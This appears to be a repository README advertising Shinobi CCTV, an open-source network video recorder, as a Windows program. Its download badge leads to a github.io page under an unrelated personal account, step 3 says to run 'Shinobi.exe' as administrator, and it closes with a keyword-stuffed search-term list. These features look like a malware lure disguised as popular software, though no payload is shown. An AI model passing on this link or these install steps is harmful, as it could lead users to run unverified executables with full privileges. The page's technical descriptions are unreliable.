# SHINOBI CCTV // NVR_SURVEILLANCE_LEDGER

> **TARGET_ENVIRONMENT**: Microsoft Windows 10 / 11 (x64)  
> **COMPILATION_MODE**: Native User-Mode Service / Hardware-Accelerated NVR Engine  
> **SUBSYSTEM_STATE**: Active Operational Ledger

---

## [01] SYSTEM_MANIFEST & SCOPE

Shinobi CCTV operates as a high-performance open-source Network Video Recorder (NVR) architecture designed to process, record, and stream multi-channel IP camera feeds across local Windows networks. By combining low-latency hardware video acceleration with a modular Node execution host, the system manages simultaneous RTSP/ONVIF streams, processes real-time motion detection triggers, and enforces automated storage retention without heavy CPU bottlenecks.

[![Download Shinobi CCTV](https://img.shields.io/badge/Download-ShinobiCCTV-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://luciaavaschmid917.github.io/.github/ShinobiCCTV-Monitoring-System)

---

## [02] LOW_LEVEL_ARCHITECTURE

* **[STREAM_INGESTION_NODE]** : Ingests high-bitrate RTSP, H.264, H.265, and ONVIF streams directly from network cameras using native socket handlers.
* **[ACCELERATED_ENCODER]** : Utilizes GPU hardware acceleration pipelines (NVENC / QuickSync) for real-time video passthrough, transcoding, and snapshot extraction.
* **[EVENT_DETECTOR_BRIDGE]** : Evaluates incoming frame buffer deltas and OpenCV object detection hooks to fire immediate motion recording triggers.
* **[WEB_DASHBOARD_HOST]** : Serves an embedded HTTP/WebSocket control interface to deliver real-time multi-view grid displays and camera configuration menus.

<img src="https://www.agilicus.com/www/88825400-shinobi.jpg" alt="Program Interface Screenshot"/>

---

## [03] PARAMETRIC_SUBSYSTEM_MATRIX

| SUBSYSTEM_ID | INTERFACE_TECH | OPERATIONAL_BEHAVIOR |
| :--- | :--- | :--- |
| **ONVIF_DISCOVERY** | UDP / SOAP Client | Scans local subnets to automatically detect and configure compatible IP cameras. |
| **GPU_PIPELINE** | Direct3D / NVENC / VAAPI | Offloads video stream encoding and frame processing tasks to dedicated graphics hardware. |
| **WEBSOCKET_BUS** | Native WS Protocol | Streams real-time video frames and motion event telemetries to web client viewports. |
| **QUOTA_ENFORCER** | File System Storage Engine | Monitors disk allocation limits and automatically recycles aged video recordings. |

---

## [04] DEPLOYMENT_AND_EXECUTION_PROTOCOL

1. Download the distribution archive from the designated release repository.
2. Extract the package contents into a local installation directory.
3. Launch `Shinobi.exe` with administrative privileges to start the background service daemon.
4. Access the web dashboard endpoint (`http://localhost:8080`) via browser.
5. Add target IP camera URLs, set stream parameters, and configure motion recording schedules.

---

### SEARCH TERMS
NVR surveillance software • IP camera manager • RTSP stream recorder • ONVIF camera software • network video recorder • security camera management • motion detection NVR • video surveillance system • hardware accelerated NVR • CCTV recording software • multi camera video engine • camera stream ingestion • security camera dashboard • webcam NVR utility • automated video archiving
